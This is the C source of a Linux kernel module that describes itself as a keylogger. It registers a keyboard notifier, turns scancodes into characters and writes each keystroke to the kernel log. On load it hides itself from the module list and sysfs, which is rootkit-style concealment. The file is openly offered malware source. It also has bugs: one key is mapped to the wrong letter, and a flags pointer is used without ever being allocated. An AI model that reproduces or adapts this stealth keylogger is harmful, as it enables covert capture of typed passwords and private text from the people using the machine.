/*----------------------------------------------------
Name:   keylog.c
Date:   2015.05.12
Auth:   Sun Dro (a.k.a. 7th Ghost / kala13x)
Desc:   Kernel Based KeyLogger Module
----------------------------------------------------*/


/* Linux includes */
#include "stdinc.h"

/*---------------------------------------------
| Flags of banti module
---------------------------------------------*/
typedef struct { 
    short module_hidden;
    short got_key;
} KeyBantiFlags;


/* Public variables */
static KeyBantiFlags *fl;
static struct list_head *module_prev;
static struct list_head *module_kobj_prev;


/*---------------------------------------------
| Initialise banti flags
---------------------------------------------*/
void init_banti(void) 
{
    fl->module_hidden = 0;
    fl->got_key = 0;
}


/*---------------------------------------------
| Handle key signal and return in char value
---------------------------------------------*/
char banti_handle_key(int key)
{
    char ret;

    /* Handle keys */
    switch(key) 
    {
        case 13:
            ret = '=';
            break;
        case 16:
            ret = 'q';
            break;
        case 17:
            ret = 'w';
            break;
        case 18:
            ret = 'e';
            break;
        case 19:
            ret = 'r';
            break;
        case 20:
            ret = 't';
            break;
        case 21:
            ret = 'y';
            break;
        case 22:
            ret = 'u';
            break;
        case 23:
            ret = 'i';
            break;
        case 24:
            ret = 'o';
            break;
        case 25:
            ret = 'p';
            break;
        case 28:
            ret = '\n';
            break;
        case 30:
            ret = 'a';
            break;
        case 31:
            ret = 'a';
            break;
        case 32:
            ret = 'd';
            break;
        case 33:
            ret = 'f';
            break;
        case 34:
            ret = 'g';
            break;
        case 35:
            ret = 'h';
            break;
        case 36:
            ret = 'j';
            break;
        case 37:
            ret = 'k';
            break;
        case 38:
            ret = 'l';
            break;
        case 39:
            ret = ';';
            break;
        case 44:
            ret = 'z';
            break;
        case 45:
            ret = 'x';
            break;
        case 46:
            ret = 'c';
            break;
        case 47:
            ret = 'v';
            break;
        case 48:
            ret = 'b';
            break;
        case 49:
            ret = 'n';
            break;
        case 50:
            ret = 'm';
            break;
        case 51:
            ret = ',';
            break;
        case 55:
            ret = '*';
            break;
        case 57:
            ret = '\t';
            break;
        case 78:
            ret = '+';
            break;
        case 98:
            ret = '/';
            break;
        case 11:
        case 82:
            ret = '0';
            break;
        case 2:
        case 79:
            ret = '1';
            break;
        case 3:
        case 80:
            ret = '2';
            break;
        case 4:
        case 81:
            ret = '3';
            break;
        case 5:
        case 75:
            ret = '4';
            break;
        case 6:
        case 76:
            ret = '5';
            break;
        case 7:
        case 77:
            ret = '6';
            break;
        case 8:
        case 71:
            ret = '7';
            break;
        case 9:
        case 72:
            ret = '8';
            break;
        case 10:
        case 73:
            ret = '9';
            break;
        case 12:
        case 74:
            ret = '-';
            break;
        case 83:
        case 52:
            ret = '.';
            break;
        default:
            ret = ' ';
            fl->got_key = -1;
            break;
    }

    return ret; 
}


/*---------------------------------------------
| Hide module
---------------------------------------------*/
void banti_module_hide(void)
{
    /* Check if alredy hided */
    if (fl->module_hidden) return;

    /* Delete in module list */
    module_prev = THIS_MODULE->list.prev;
    list_del(&THIS_MODULE->list);

    /* Reinitialise list */
    module_kobj_prev = THIS_MODULE->mkobj.kobj.entry.prev;
    kobject_del(&THIS_MODULE->mkobj.kobj);
    list_del(&THIS_MODULE->mkobj.kobj.entry);

    /* Flag up */
    fl->module_hidden = 1;
}


/*---------------------------------------------
| Make module visible
---------------------------------------------*/
void banti_module_show(void)
{
    int result;

    /* Check if alredy hided */
    if (!fl->module_hidden) return;

    /* Add module in list */
    list_add(&THIS_MODULE->list, module_prev);
    result = kobject_add(&THIS_MODULE->mkobj.kobj, THIS_MODULE->mkobj.kobj.parent, "rt");

    /* Flag down */
    fl->module_hidden = 0;
}


/*---------------------------------------------
| Get notifed press key
---------------------------------------------*/
int banti_key_notifer(struct notifier_block *nblock, unsigned long code, void *_param) 
{
    /* Used variables */
    char key;
    struct keyboard_notifier_param *param = _param;

    if (code == KBD_KEYCODE)
    {
        /* Get and log key */
        key = banti_handle_key(param->value);
        if(param->down || fl->got_key >= 0)
            printk(KERN_INFO "%c", key);

        fl->got_key = 1;
    }

    return NOTIFY_OK;
}


/*---------------------------------------------
| Module notification block
---------------------------------------------*/
static struct notifier_block notifer_deamon =
{
    .notifier_call = banti_key_notifer
};


/*---------------------------------------------
| Register keyboard module
---------------------------------------------*/
static int __init banti_keylog_init(void)
{
    /* Hide module */
    init_banti();
    banti_module_hide();

    /* Register notifier */
    register_keyboard_notifier(&notifer_deamon);
    printk(KERN_INFO "Registring banti keyboard module\n");
    return 0;
}


/*---------------------------------------------
| Clean keyboard module
---------------------------------------------*/
static void __exit banti_keylog_clean(void)
{
    unregister_keyboard_notifier(&notifer_deamon);
    printk(KERN_INFO "Unregistered banti keyboard module\n");
}


/*---------------------------------------------
| Module initialisations
---------------------------------------------*/
module_init(banti_keylog_init);
module_exit(banti_keylog_clean);
MODULE_LICENSE(DRIVER_LICENSE);